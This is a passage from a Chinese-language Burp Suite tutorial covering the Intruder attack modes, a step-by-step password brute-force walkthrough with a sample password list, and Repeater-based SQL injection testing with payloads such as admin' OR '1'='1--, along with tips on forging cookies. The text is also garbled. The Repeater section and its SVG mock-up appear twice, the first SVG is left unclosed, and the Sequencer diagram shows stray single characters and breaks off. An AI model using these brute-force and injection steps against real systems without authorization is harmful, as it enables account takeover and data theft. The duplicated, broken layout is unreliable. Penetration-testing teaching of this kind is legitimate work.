- 修改请求内容
- 再次发送
- 观察响应变化

### Repeater使用步骤

**步骤1：发送请求到Repeater**

1. 在Proxy HTTP history中选择请求
2. 右键 → "Send to Repeater"
3. 切换到Repeater标签

**🔁 Repeater 手动重放请求界面说明：**

<svg viewBox="0 0 800 450" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="repBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0c1220"/>
      <stop offset="100%" stop-color="#020617"/>
    </linearGradient>
  </defs>
  <rect width="800" height="450" rx="12" fill="url(#repBg)" stroke="#1e293b"/>
  <text x="400" y="26" text-anchor="middle" fill="#e2e8f0" font-size="16" font-weight="bold" font-family="Arial">🔁 Repeater 重放器（手动请求修改+反复测试最实用工具）</text>

  <!-- 标签头 -->
  <g transform="translate(10, 44)">
    <rect x="0" y="0" width="780" height="32" rx="6" fill="#111827" stroke="#334155"/>
    <rect x="6" y="4" width="120" height="24" rx="4" fill="#7c3aed" stroke="#a855f7"/>
    <text x="66" y="21" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🔖 #1 · login.php</text>
    <rect x="132" y="4" width="100" height="24" rx="4" fill="#0f172a" stroke="#334155"/>
    <text x="182" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">+ New tab</text>
    <!-- 顶部操作按钮 -->
    <rect x="540" y="4" width="60" height="24" rx="4" fill="#334155" stroke="#64748b"/>
    <text x="570" y="21" text-anchor="middle" fill="#cbd5e1" font-size="11" font-family="Arial">◀◀ Go</text>
    <rect x="606" y="4" width="70" height="24" rx="4" fill="#16a34a" stroke="#22c55e"/>
    <text x="641" y="21" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">▶ Send</text>
    <rect x="682" y="4" width="92" height="24" rx="4" fill="#475569" stroke="#94a3b8"/>
    <text x="728" y="21" text-anchor="middle" fill="#e2e8f0" font-size="11" font-family="Arial">🔃 Pretty</text>
  </g>

  <!-- 左：请求区 -->
  <g transform="translate(10, 86)">
    <rect x="0" y="0" width="382" height="354" rx="6" fill="#0b1120" stroke="#334155" stroke-width="1.5"/>
    <!-- 标题 -->
    <rect x="0" y="0" width="382" height="30" rx="6" fill="#1e293b"/>
    <rect x="0" y="15" width="382" height="15" fill="#1e293b"/>
    <text x="12" y="21" fill="#38bdf8" font-size="12" font-weight="bold" font-family="Arial">📤 Request（请求 - 你可以随意修改再发送）</text>
    <!-- 子Tab -->
    <g transform="translate(6, 36)">
      <rect x="0" y="0" width="60" height="20" rx="3" fill="#0369a1" stroke="#0ea5e9"/>
      <text x="30" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold" font-family="Arial">Raw</text>
      <rect x="66" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="96" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Params</text>
      <rect x="132" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="162" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Headers</text>
      <rect x="198" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="228" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Body</text>
    </g>
    <!-- 请求内容 -->
    <g transform="translate(10, 70)" font-family="Consolas, monospace" font-size="11.5">
      <text x="0" y="0" fill="#22d3ee" font-weight="bold">POST /login.php HTTP/1.1</text>
      <text x="0" y="22" fill="#f472b6">Host:</text><text x="42" y="22" fill="#cbd5e1">testphp.vulnweb.com</text>
      <text x="0" y="42" fill="#f472b6">User-Agent:</text><text x="84" y="42" fill="#cbd5e1">Mozilla/5.0 (Windows NT 10.0)</text>
      <text x="0" y="62" fill="#f472b6">Content-Type:</text><text x="90" y="62" fill="#cbd5e1">application/x-www-form-urlencoded</text>
      <text x="0" y="82" fill="#f472b6">Content-Length:</text><text x="106" y="82" fill="#fde047">35</text>
      <text x="0" y="102" fill="#f472b6">Cookie:</text><text x="44" y="102" fill="#cbd5e1">test_cookie=</text><text x="126" y="102" fill="#fbbf24" font-weight="bold">← 可改 Cookie 伪造身份</text>
      <line x1="0" y1="120" x2="362" y2="120" stroke="#334155"/>
      <text x="0" y="146" fill="#86efac">uname=</text><text x="52" y="146" fill="#ef4444" font-weight="bold">admin'</text>
      <text x="130" y="146" fill="#86efac">&pass=</text><text x="172" y="146" fill="#ef4444" font-weight="bold">123456</text>
      <text x="230" y="146" fill="#fde047" font-weight="bold">← 单引号测试SQL注入！</text>
    </g>
    <!-- 帮助 -->
    <rect x="10" y="260" width="362" height="78" rx="5" fill="#1e1b4b" stroke="#4c1d95" opacity="0.7"/>
    <text x="22" y="282" fill="#fbbf24" font-size="12" font-weight="bold" font-family="Arial">🛠️ Repeater 典型用法：</text>
    <text x="22" y="302" fill="#ddd6fe" font-size="11" font-family="Arial">① 改参数值 → 点Send → 看响应变化</text>
    <text x="22" y="320" fill="#ddd6fe" font-size="11" font-family="Arial">② SQL注入/XSS测试：逐字符调整 Payload</text>
    <text x="22" y="338" fill="#ddd6fe" font-size="11" font-family="Arial">③ 修改请求头/UA/Cookie 绕过验证</text>
  </g>

  <!-- 右：响应区 -->
  <g transform="translate(408, 86)">
    <rect x="0" y="0" width="382" height="354" rx="6" fill="#0b1120" stroke="#334155" stroke-width="1.5"/>
    <!-- 标题（带状态） -->
    <rect x="0" y="0" width="382" height="30" rx="6" fill="#3f1d1d"/>
    <rect x="0" y="15" width="382" height="15" fill="#3f1d1d"/>
    <text x="12" y="21" fill="#ef4444" font-size="12" font-weight="bold" font-family="Arial">📥 Response（响应 · 500 Error！报错 → 注入有戏！）</text>
    <!-- 子Tab -->
    <g transform="translate(6, 36)">
      <rect x="0" y="0" width="60" height="20" rx="3" fill="#b91c1c" stroke="#ef4444"/>
      <text x="30" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold" font-family="Arial">Raw</text>
      <rect x="66" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="96" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Headers</text>
      <rect x="132" y="0" width="74" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="169" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Response</text>
      <rect x="212" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="242" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Render</text>
      <text x="300" y="16" fill="#fca5a5" font-size="11" font-weight="bold" font-family="Arial">⏱  82ms &#124; ⬇ 2.8 KB</text>
    </g>
    <!-- 响应内容 -->
    <g transform="translate(10, 70)" font-family="Consolas, monospace" font-size="11">
      <text x="0" y="0" fill="#ef4444" font-weight="bold">HTTP/1.1 500 Internal Server Error</text>
      <text x="0" y="20" fill="#86efac">Date: Wed, 26 Jun 2026 09:00:00 GMT</text>
      <text x="0" y="38" fill="#86efac">Server: Apache/2.2.22 (Ubuntu)</text>
      <text x="0" y="56" fill="#86efac">X-Powered-By: PHP/5.3.10-1ubuntu3</text>
      <line x1="0" y1="74" x2="362" y2="74" stroke="#334155"/>
      <text x="0" y="100" fill="#fbbf24">&lt;br /&gt;</text>
      <text x="0" y="120" fill="#fbbf24">&lt;b&gt;Warning&lt;/b&gt;:  mysql_fetch_assoc(): supplied argument is not a valid MySQL result</text>
      <text x="0" y="140" fill="#fbbf24">resource in &lt;b&gt;/var/www/login.php&lt;/b&gt; on line &lt;b&gt;23&lt;/b&gt;</text>
      <rect x="0" y="160" width="362" height="30" rx="3" fill="#052e16" stroke="#22c55e" stroke-width="1.5"/>
      <text x="10" y="180" fill="#4ade80" font-weight="bold" font-family="Arial">✅ 漏洞验证成功！报错泄露 SQL/路径/PHP版本 → 证明SQL注入真实存在</text>
    </g>
    <!-- 对比按钮 -->
    <g transform="translate(0, 310)">
      <rect x="10" y="0" width="175" height="34" rx="5" fill="#7c3aed" stroke="#a78bfa"/>
      <text x="98" y="22" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🔎 查看上次响应对比</text>
      <rect x="197" y="0" width="175" height="34" rx="5" fill="#b45309" stroke="#f59e0b"/>
      <text x="285" y="22" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">💥 Send to Intruder</text>
    </g>
  </g>


#### 1. Sniper模式（狙击模式）

**特点**：单目标，单payload

**通俗理解**：一把枪，瞄准一个靶子，换不同子弹射击

**工作原理**：
- 选择一个位置（比如密码字段）
- 使用一个payload列表（比如1000个密码）
- 逐个尝试每个密码

**适用场景**：
- 测试单个参数
- 爆破单个密码字段

**示例**：
```
请求：POST /login username=admin&password=§test§

Payload列表：
test
123456
admin
password
...

执行过程：
第1次：password=test
第2次：password=123456
第3次：password=admin
...
```

#### 2. Battering ram模式（攻城锤模式）

**特点**：多目标，单payload

**通俗理解**：一把枪，瞄准多个靶子，每次用相同的子弹

**工作原理**：
- 选择多个位置（比如用户名和密码）
- 使用一个payload列表
- 每次请求，所有位置使用相同payload

**适用场景**：
- 测试用户名=密码的情况

**示例**：
```
请求：POST /login username=§user§&password=§pass§

Payload列表：
admin
test
root
...

执行过程：
第1次：username=admin&password=admin
第2次：username=test&password=test
第3次：username=root&password=root
...
```

#### 3. Pitchfork模式（叉子模式）

**特点**：多目标，多payload（一对一）

**通俗理解**：一把双管猎枪，瞄准两个靶子，每管用不同的子弹序列

**工作原理**：
- 选择多个位置
- 每个位置使用不同的payload列表
- 同步迭代，一对一匹配

**适用场景**：
- 用户名和密码配对爆破（已知用户名，尝试对应密码）

**示例**：
```
请求：POST /login username=§user§&password=§pass§

用户名列表：admin, user, guest
密码列表：admin123, user456, guest789

执行过程：
第1次：username=admin&password=admin123
第2次：username=user&password=user456
第3次：username=guest&password=guest789
```

#### 4. Cluster bomb模式（集束炸弹模式）

**特点**：多目标，多payload（全排列）

**通俗理解**：一把超级武器，瞄准多个靶子，每管用不同子弹，且组合所有可能

**工作原理**：
- 选择多个位置
- 每个位置使用不同的payload列表
- 全排列组合

**适用场景**：
- 用户名和密码组合爆破（不知道哪个用户名配哪个密码）

**示例**：
```
请求：POST /login username=§user§&password=§pass§

用户名列表：admin, user
密码列表：123, 456

执行过程（2×2=4次）：
第1次：username=admin&password=123
第2次：username=admin&password=456
第3次：username=user&password=123
第4次：username=user&password=456
```

### Intruder使用步骤

**步骤1：发送请求到Intruder**

1. 在Proxy HTTP history中选择一个请求
2. 右键 → "Send to Intruder"
3. 切换到Intruder标签

**步骤2：设置攻击位置**

1. 点击"Positions"子标签
2. Burp Suite会自动用§符号标记一些位置
3. 你可以手动添加或删除标记：
   - 选中文本，点击"Add §"添加标记
   - 点击"Clear §"清除所有标记

**步骤3：选择攻击模式**

在"Attack type"下拉框中选择：
- Sniper
- Battering ram
- Pitchfork
- Cluster bomb

**步骤4：配置Payload**

点击"Payloads"子标签：

1. 设置Payload数量（根据攻击模式）
2. 选择Payload类型：
   - Simple list：简单列表
   - Runtime file：从文件读取
   - Numbers：数字范围
   - Brute forcer：暴力破解字符组合
   - Custom iterator：自定义迭代器

3. 添加Payload内容：
   - 手动输入列表项
   - 或从文件导入

**步骤5：配置选项**

点击"Options"子标签，可以设置：
- Request Engine：并发数、延迟等
- Grep - Match：匹配响应中的特定内容
- Grep - Extract：提取响应中的特定内容

**步骤6：启动攻击**

点击右上角"Start attack"按钮，攻击开始。

**步骤7：分析结果**

攻击窗口会显示所有请求和响应：

| 列 | 说明 |
|------|------|
| Request # | 请求序号 |
| Payload | 使用的payload |
| Status | 响应状态码 |
| Length | 响应长度 |
| Time | 响应时间 |
| Result | 匹配结果 |

**发现成功请求的技巧：**

1. **状态码不同**：成功的请求可能返回302重定向或200
2. **长度不同**：成功的响应长度可能与失败不同
3. **匹配关键词**：配置Grep-Match搜索"成功"、"登录成功"等关键词

### 实战：暴力破解登录密码

让我们实战一下，假设目标网站：`http://target.example.com/login`

**步骤1：抓取登录请求**

1. 配置浏览器代理
2. 在浏览器中访问登录页面
3. 输入测试用户名密码（如test/test）
4. 点击登录
5. Burp Suite拦截登录请求

你会看到类似这样的请求：
```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

**步骤2：发送到Intruder**

右键请求 → "Send to Intruder"

**步骤3：设置攻击位置**

假设我们知道用户名是admin，只需要爆破密码：

1. 点击Positions标签
2. 清除所有§标记
3. 只在password值前后添加§标记：
   `username=admin&password=§test§`

3. 选择攻击模式：Sniper

**步骤4：配置Payload**

1. 点击Payloads标签
2. Payload type: Simple list
3. 添加常用密码：
   ```
   123456
   password
   admin
   admin123
   123456789
   qwerty
   letmein
   welcome
   monkey
   dragon
   ...
   ```

或者使用密码字典文件：
- Runtime file
- 选择字典文件（如rockyou.txt的一部分）

**步骤5：配置成功匹配**

点击Options标签：
- Grep - Match
- 添加关键词："登录成功"、"success"、"welcome"

或者观察失败响应的特征，比如包含"密码错误"，成功的响应应该不包含这个。

**步骤6：启动攻击**

点击"Start attack"

**步骤7：分析结果**

观察攻击窗口：
- 找到状态码不同的请求（如302）
- 找到长度不同的请求
- 找到匹配到关键词的请求

如果某个请求返回302重定向到`/dashboard`，说明密码正确！

### Payload类型详解

| Payload类型 | 说明 | 适用场景 |
|-------------|------|----------|
| Simple list | 简单列表 | 自定义少量payload |
| Runtime file | 从文件读取 | 大型字典文件 |
| Numbers | 数字范围 | 遍历ID、年份等 |
| Brute forcer | 暴力字符组合 | 短密码暴力破解 |
| Custom iterator | 自定义迭代器 | 复杂组合 |
| Character blocks | 字符块 | 测试缓冲区溢出 |
| Case modification | 大小写变换 | 测试大小写敏感 |
| Regex generator | 正则生成 | 按正则规则生成 |
| Payload encoding | 编码转换 | URL编码、Base64等 |

---

## 1.14 Repeater模块详解

### Repeater模块是什么？

Repeater（重发器）就像一个"实验工作台"，让你可以手工修改请求并反复发送，观察服务器响应的变化。

想象你在写信测试朋友的反应：
- 第一封信写"你好"
- 第二封信写"你好啊"
- 第三封信写"你好吗"

通过对比朋友的回复，了解不同内容的影响。

Repeater就是这样：
- 发送原始请求
- 修改请求内容
- 再次发送
- 观察响应变化

### Repeater使用步骤

**步骤1：发送请求到Repeater**

1. 在Proxy HTTP history中选择请求
2. 右键 → "Send to Repeater"
3. 切换到Repeater标签

**🔁 Repeater 手动重放请求界面说明：**

<svg viewBox="0 0 800 450" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="repBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0c1220"/>
      <stop offset="100%" stop-color="#020617"/>
    </linearGradient>
  </defs>
  <rect width="800" height="450" rx="12" fill="url(#repBg)" stroke="#1e293b"/>
  <text x="400" y="26" text-anchor="middle" fill="#e2e8f0" font-size="16" font-weight="bold" font-family="Arial">🔁 Repeater 重放器（手动请求修改+反复测试最实用工具）</text>

  <!-- 标签头 -->
  <g transform="translate(10, 44)">
    <rect x="0" y="0" width="780" height="32" rx="6" fill="#111827" stroke="#334155"/>
    <rect x="6" y="4" width="120" height="24" rx="4" fill="#7c3aed" stroke="#a855f7"/>
    <text x="66" y="21" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🔖 #1 · login.php</text>
    <rect x="132" y="4" width="100" height="24" rx="4" fill="#0f172a" stroke="#334155"/>
    <text x="182" y="21" text-anchor="middle" fill="#94a3b8" font-size="12" font-family="Arial">+ New tab</text>
    <!-- 顶部操作按钮 -->
    <rect x="540" y="4" width="60" height="24" rx="4" fill="#334155" stroke="#64748b"/>
    <text x="570" y="21" text-anchor="middle" fill="#cbd5e1" font-size="11" font-family="Arial">◀◀ Go</text>
    <rect x="606" y="4" width="70" height="24" rx="4" fill="#16a34a" stroke="#22c55e"/>
    <text x="641" y="21" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">▶ Send</text>
    <rect x="682" y="4" width="92" height="24" rx="4" fill="#475569" stroke="#94a3b8"/>
    <text x="728" y="21" text-anchor="middle" fill="#e2e8f0" font-size="11" font-family="Arial">🔃 Pretty</text>
  </g>

  <!-- 左：请求区 -->
  <g transform="translate(10, 86)">
    <rect x="0" y="0" width="382" height="354" rx="6" fill="#0b1120" stroke="#334155" stroke-width="1.5"/>
    <!-- 标题 -->
    <rect x="0" y="0" width="382" height="30" rx="6" fill="#1e293b"/>
    <rect x="0" y="15" width="382" height="15" fill="#1e293b"/>
    <text x="12" y="21" fill="#38bdf8" font-size="12" font-weight="bold" font-family="Arial">📤 Request（请求 - 你可以随意修改再发送）</text>
    <!-- 子Tab -->
    <g transform="translate(6, 36)">
      <rect x="0" y="0" width="60" height="20" rx="3" fill="#0369a1" stroke="#0ea5e9"/>
      <text x="30" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold" font-family="Arial">Raw</text>
      <rect x="66" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="96" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Params</text>
      <rect x="132" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="162" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Headers</text>
      <rect x="198" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="228" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Body</text>
    </g>
    <!-- 请求内容 -->
    <g transform="translate(10, 70)" font-family="Consolas, monospace" font-size="11.5">
      <text x="0" y="0" fill="#22d3ee" font-weight="bold">POST /login.php HTTP/1.1</text>
      <text x="0" y="22" fill="#f472b6">Host:</text><text x="42" y="22" fill="#cbd5e1">testphp.vulnweb.com</text>
      <text x="0" y="42" fill="#f472b6">User-Agent:</text><text x="84" y="42" fill="#cbd5e1">Mozilla/5.0 (Windows NT 10.0)</text>
      <text x="0" y="62" fill="#f472b6">Content-Type:</text><text x="90" y="62" fill="#cbd5e1">application/x-www-form-urlencoded</text>
      <text x="0" y="82" fill="#f472b6">Content-Length:</text><text x="106" y="82" fill="#fde047">35</text>
      <text x="0" y="102" fill="#f472b6">Cookie:</text><text x="44" y="102" fill="#cbd5e1">test_cookie=</text><text x="126" y="102" fill="#fbbf24" font-weight="bold">← 可改 Cookie 伪造身份</text>
      <line x1="0" y1="120" x2="362" y2="120" stroke="#334155"/>
      <text x="0" y="146" fill="#86efac">uname=</text><text x="52" y="146" fill="#ef4444" font-weight="bold">admin'</text>
      <text x="130" y="146" fill="#86efac">&pass=</text><text x="172" y="146" fill="#ef4444" font-weight="bold">123456</text>
      <text x="230" y="146" fill="#fde047" font-weight="bold">← 单引号测试SQL注入！</text>
    </g>
    <!-- 帮助 -->
    <rect x="10" y="260" width="362" height="78" rx="5" fill="#1e1b4b" stroke="#4c1d95" opacity="0.7"/>
    <text x="22" y="282" fill="#fbbf24" font-size="12" font-weight="bold" font-family="Arial">🛠️ Repeater 典型用法：</text>
    <text x="22" y="302" fill="#ddd6fe" font-size="11" font-family="Arial">① 改参数值 → 点Send → 看响应变化</text>
    <text x="22" y="320" fill="#ddd6fe" font-size="11" font-family="Arial">② SQL注入/XSS测试：逐字符调整 Payload</text>
    <text x="22" y="338" fill="#ddd6fe" font-size="11" font-family="Arial">③ 修改请求头/UA/Cookie 绕过验证</text>
  </g>

  <!-- 右：响应区 -->
  <g transform="translate(408, 86)">
    <rect x="0" y="0" width="382" height="354" rx="6" fill="#0b1120" stroke="#334155" stroke-width="1.5"/>
    <!-- 标题（带状态） -->
    <rect x="0" y="0" width="382" height="30" rx="6" fill="#3f1d1d"/>
    <rect x="0" y="15" width="382" height="15" fill="#3f1d1d"/>
    <text x="12" y="21" fill="#ef4444" font-size="12" font-weight="bold" font-family="Arial">📥 Response（响应 · 500 Error！报错 → 注入有戏！）</text>
    <!-- 子Tab -->
    <g transform="translate(6, 36)">
      <rect x="0" y="0" width="60" height="20" rx="3" fill="#b91c1c" stroke="#ef4444"/>
      <text x="30" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold" font-family="Arial">Raw</text>
      <rect x="66" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="96" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Headers</text>
      <rect x="132" y="0" width="74" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="169" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Response</text>
      <rect x="212" y="0" width="60" height="20" rx="3" fill="#020617" stroke="#475569"/>
      <text x="242" y="15" text-anchor="middle" fill="#94a3b8" font-size="10" font-family="Arial">Render</text>
      <text x="300" y="16" fill="#fca5a5" font-size="11" font-weight="bold" font-family="Arial">⏱  82ms &#124; ⬇ 2.8 KB</text>
    </g>
    <!-- 响应内容 -->
    <g transform="translate(10, 70)" font-family="Consolas, monospace" font-size="11">
      <text x="0" y="0" fill="#ef4444" font-weight="bold">HTTP/1.1 500 Internal Server Error</text>
      <text x="0" y="20" fill="#86efac">Date: Wed, 26 Jun 2026 09:00:00 GMT</text>
      <text x="0" y="38" fill="#86efac">Server: Apache/2.2.22 (Ubuntu)</text>
      <text x="0" y="56" fill="#86efac">X-Powered-By: PHP/5.3.10-1ubuntu3</text>
      <line x1="0" y1="74" x2="362" y2="74" stroke="#334155"/>
      <text x="0" y="100" fill="#fbbf24">&lt;br /&gt;</text>
      <text x="0" y="120" fill="#fbbf24">&lt;b&gt;Warning&lt;/b&gt;:  mysql_fetch_assoc(): supplied argument is not a valid MySQL result</text>
      <text x="0" y="140" fill="#fbbf24">resource in &lt;b&gt;/var/www/login.php&lt;/b&gt; on line &lt;b&gt;23&lt;/b&gt;</text>
      <rect x="0" y="160" width="362" height="30" rx="3" fill="#052e16" stroke="#22c55e" stroke-width="1.5"/>
      <text x="10" y="180" fill="#4ade80" font-weight="bold" font-family="Arial">✅ 漏洞验证成功！报错泄露 SQL/路径/PHP版本 → 证明SQL注入真实存在</text>
    </g>
    <!-- 对比按钮 -->
    <g transform="translate(0, 310)">
      <rect x="10" y="0" width="175" height="34" rx="5" fill="#7c3aed" stroke="#a78bfa"/>
      <text x="98" y="22" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">🔎 查看上次响应对比</text>
      <rect x="197" y="0" width="175" height="34" rx="5" fill="#b45309" stroke="#f59e0b"/>
      <text x="285" y="22" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">💥 Send to Intruder</text>
    </g>
  </g>
</svg>

**步骤2：修改请求**

在Request区域修改内容，比如：
- 修改参数值
- 修改Cookie
- 添加Header
- 修改请求体

**步骤3：发送请求**

点击"Send"按钮，发送修改后的请求

**步骤4：分析响应**

查看Response区域，对比原始响应和修改后响应的区别。

### Repeater界面详解

**Request区域：**

| 标签 | 功能 |
|------|------|
| Raw | 原始HTTP请求 |
| Params | 参数视图，便于查看和修改参数 |
| Headers | Header视图，便于查看和修改Header |
| Hex | 十六进制视图 |

**Response区域：**

| 标签 | 功能 |
|------|------|
| Raw | 原始HTTP响应 |
| Headers | Header视图 |
| Hex | 十六进制视图 |
| HTML | HTML渲染视图（显示网页效果） |
| Links | 提取响应中的链接 |
| Analysis | 响应分析（统计信息） |

**功能按钮：**

| 按钮 | 功能 |
|------|------|
| Send | 发送请求 |
| Auto | 自动发送（每次修改后自动发送） |
| History | 查看历史请求 |

### 实战：测试SQL注入

假设你发现登录请求：
```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

**步骤1：发送到Repeater**

右键 → "Send to Repeater"

**步骤2：尝试SQL注入**

修改username为：
```
username=admin'&password=admin
```

点击Send，观察响应。

如果响应报错，说明可能存在SQL注入：
```
You have an error in your SQL syntax...
```

**步骤3：进一步测试**

尝试更多注入payload：
```
username=admin' OR '1'='1--&password=admin
username=admin'--&password=admin
username=admin' AND 1=1--&password=admin
username=admin' AND 1=2--&password=admin
```

对比每个响应：
- 如果`' OR '1'='1`返回成功登录，确认存在SQL注入
- 如果`' AND 1=1`和`' AND 1=2`返回不同，确认存在布尔盲注

---

## 1.15 Sequencer模块详解

<svg viewBox="0 0 1080 560" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1080px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1124;">
  <defs>
    <linearGradient id="gtseq" x1="0" x2="1"><stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#ef4444"/></linearGradient>
    <linearGradient id="gbseq" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0b1220"/></linearGradient>
    <marker id="arseq" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#fbbf24"/></marker>
    <filter id="shseq"><feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="#000" flood-opacity=".5"/></filter>
  </defs>
  <rect x="0" y="0" width="100%" height="100%" fill="url(#gbseq)" rx="14"/>
  <text x="540" y="44" text-anchor="middle" fill="url(#gtseq)" font-size="22" font-weight="bold" font-family="Microsoft YaHei,Arial">Burp Sequencer 会话令牌随机性检测流程</text>
  <text x="540" y="72" text-anchor="middle" fill="#94a3b8" font-size="13" font-family="Microsoft YaHei,Arial">收集样本 → 熵值分析 → 字符级分析 → 位级分析 → FIPS 140-2 测试 → 风险评估</text>
  <rect x="90" y="150" width="160" height="220" rx="10" fill="#1e40af" fill-opacity=".22" stroke="#1e40af" stroke-width="1.8" filter="url(#shseq)"/>
  <text x="170.0" y="176" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">1 收集令牌</text>
  <text x="104" y="202" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">#</text>
  <text x="104" y="220" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">7</text>
  <text x="104" y="238" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">c</text>
  <text x="104" y="256" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">3</text>
  <text x="104" y="274" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">a</text>
  <text x="104" y="292" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">e</text>
  <text x="104" y="310" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">d</text>
  <rect x="270" y="150" width="160" height="220" rx="10" fill="#1e40af" fill-opacity=".22" stroke="#1e40af" stroke-width="1.8" filter="url(#shseq)"/>
  <text x="350.0" y="176" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">2 基础分析</text>
  <text x="284" y="202" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">样本数量 ≥ 10000</text>
  <text x="284" y="220" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">字符分布均匀度</text>
  <text x="284" y="238" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">平均熵 bits/char</text>
  <rect x="450" y="150" width="160" height="220" rx="10" fill="#1e40af" fill-opacity=".22" stroke="#1e40af" stroke-width="1.8" filter="url(#shseq)"/>
  <text x="530.0" y="176" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">3 字符/位级</text>
  <text x="464" y="202" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">#</text>
  <text x="464" y="220" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">7</text>
  <text x="464" y="238" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">c</text>
  <text x="464" y="256" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">3</text>
  <text x="464" y="274" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">a</text>
  <text x="464" y="292" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">e</text>
  <text x="464" y="310" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">d</text>
  <rect x="630" y="150" width="160" height="220" rx="10" fill="#1e40af" fill-opacity=".22" stroke="#1e40af" stroke-width="1.8" filter="url(#shseq)"/>
  <text x="710.0" y="176" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">4 FIPS 测试</text>
  <text x="644" y="202" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">单比特频率测试</text>
  <text x="644" y="220" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">长游程测试</text>
  <text x="644" y="238" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">扑克 / 块测试</text>
  <rect x="810" y="150" width="160" height="220" rx="10" fill="#1e40af" fill-opacity=".22" stroke="#1e40af" stroke-width="1.8" filter="url(#shseq)"/>
  <text x="890.0" y="176" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">5 风险报告</text>
  <text x="824" y="202" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">#</text>
  <text x="824" y="220" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">7</text>
  <text x="824" y="238" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">c</text>
  <text x="824" y="256" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">3</text>
